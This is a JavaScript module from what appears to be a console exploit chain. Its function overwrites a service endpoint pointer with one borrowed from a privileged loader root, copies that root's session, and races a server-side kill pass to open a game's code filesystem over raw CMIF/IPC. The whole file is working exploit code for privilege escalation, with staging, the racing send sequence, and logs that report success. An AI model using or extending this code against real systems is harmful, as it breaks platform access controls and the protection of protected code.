// kaiHEN port — instant-send probe (IS). The kill is an asynchronous
// server-side pass (SB: send-less, 10ms-4s after creation; the alive
// domain row never moves). Every 0xF601 we ever recorded was on a send
// that fired tens-of-ms to seconds after its copy — the author engine's
// native RPC thread sends within microseconds. IS removes every step
// between copy and send: the code-open packet and the borrow pointer are
// staged BEFORE the copy, so the send leaves one IPC after the copy
// reply:
//   transport 0    -> we beat the killer pass; the port bug is DELAY
//   transport 0xF601 -> the session is closed at creation after all

import runtime from "../core/runtime.mjs";
import {check, khLog, hex, arenaSlots, arenaAlloc, track, u64Bytes}
    from "./state.mjs";
import {readFs, writeFs} from "./endpoint.mjs";
import {cmifSend, bareSendTransport, buildCmif, oneMovedHandle}
    from "./wire.mjs";

const {cmifReply, sendIPC} = runtime;

export async function instantSendProbe(context, title) {
    const owned = context.inspectionDomain;
    const target = context.loaderRoot;
    const ep = context.ep;
    check(owned && target && context.loaderCopy && ep && ep.armed,
        "instant-send requires the loader-copy state");

    const entry20 = context.loaderCopy.ownEntry + 0x20;
    // Pre-stage everything that costs an IPC: warm the endpoint pointer at
    // the entry, read both pairs, build the code-open packet.
    await readFs(context, entry20, 8);
    const oldPair = await readFs(context, entry20, 0x10);
    const borrowPair = await readFs(context, target.entry + 0x20, 0x10);
    const slots = arenaSlots(context);
    const info = arenaAlloc(context, 0x2000, "is-info");
    buildCmif(slots.pkt, {cmd: 0,
        input: [1, 3, 0, 0, 0, 0, 0, 0].concat(u64Bytes(BigInt(title))),
        b: [{addr: info + 32n, size: 0x1a4}]});

    // The race: borrow-write (1 IPC), copy (1 IPC), then the transport
    // battery — every send fires within the pre-kill window (~5-400ms).
    await writeFs(context, entry20, borrowPair);
    let copyHandle = 0;
    try {
        const reply = cmifSend(owned.handle, {pkt: slots.pkt,
            control: true, cmd: 1,
            input: [owned.root & 0xff, owned.root >> 8 & 0xff,
                owned.root >> 16 & 0xff, owned.root >> 24 & 0xff],
            rawWords: 9});
        const copyRc = reply.transport;
        if (copyRc === 0 && reply.moves && reply.moves.length)
            copyHandle = track(context, reply.moves[0], "is-copy");
        await khLog("IS1 copy rc=" + hex(copyRc) +
            " handle=" + hex(copyHandle));
        if (copyHandle) {
            // The session dies exactly when OpenCodeFileSystem is sent on
            // it (runs 48-57 cross-reference: benign traffic transports 0
            // for seconds, code-open kills). The proxy may simply be
            // uninitialized: the game's own fs session got SetCurrentProcess
            // (cmd 2) at SDK init — a fresh copy has not. Init, then open.
            buildCmif(slots.pkt2, {cmd: 1, input: u64Bytes(0x10n)});
            const t1 = bareSendTransport(copyHandle, slots.pkt2);
            buildCmif(slots.pkt2, {cmd: 2, input: u64Bytes(1n)});
            const sp = bareSendTransport(copyHandle, slots.pkt2);
            let spR = "-";
            if (sp === 0) spR = hex(cmifReply(slots.pkt2).result);
            buildCmif(slots.pkt, {cmd: 0,
                input: [1, 3, 0, 0, 0, 0, 0, 0].concat(u64Bytes(BigInt(title))),
                b: [{addr: info, size: 0x1a4}]});
            const t2 = bareSendTransport(copyHandle, slots.pkt);
            await khLog("IS2 trivial=" + hex(t1) +
                " SetCurrentProcess(1)=" + hex(sp) + "/" + spR +
                " code-open=" + hex(t2));
            if (t2 === 0) {
                const parsed = cmifReply(slots.pkt);
                await khLog("IS3 result=" + hex(parsed.result) +
                    " moves=" + (parsed.moves ? parsed.moves.length : 0));
                if (parsed.result === 0 && parsed.moves && parsed.moves.length) {
                    context.instantCodeFs = track(context, parsed.moves[0],
                        "is-codefs");
                    await khLog("IS4 ***CODE FS OPEN*** handle=" +
                        hex(context.instantCodeFs));
                }
            }
        }
    } finally {
        await writeFs(context, entry20, oldPair);
    }
    // Retain the copied root when the code-open lived (the reference keeps
    // its copied roots for later code-opens); close only the dead ones.
    if (copyHandle && !context.instantCodeFs)
        try { runtime.closeHandle(copyHandle); }
        catch (error) { /* dead */ }
    return {ok: true};
}
